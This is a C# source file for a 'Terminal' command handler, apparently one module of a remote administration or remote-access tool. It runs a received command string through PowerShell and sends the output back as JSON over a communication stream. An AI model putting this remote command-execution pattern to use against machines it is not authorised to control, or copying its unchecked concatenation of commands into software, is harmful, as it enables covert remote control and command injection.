using Newtonsoft.Json;
using System;
using System.Diagnostics;

namespace ChildProcess
{
    internal class Terminal : ICommandHandler
    {
        private string commandToRun;

        public Terminal(string command)
        {
            commandToRun = command;
        }

        public void HandleCommand(Communication stream)
        {
            string output;
            string error;

            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = "-Command " + commandToRun;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.Start();

                output = process.StandardOutput.ReadToEnd();
                error = process.StandardError.ReadToEnd();
                process.WaitForExit();
            }
            catch (Exception ex)
            {
                output = string.Empty;
                error = ex.Message;
            }

            var jsonData = new
            {
                Command = commandToRun,
                Output = output,
                Error = error,
                FeatureName = "Terminal"


            };

            string jsonString = JsonConvert.SerializeObject(jsonData, Formatting.Indented);
            Console.WriteLine(jsonString);


            stream.Send(jsonString);
        }

    }
}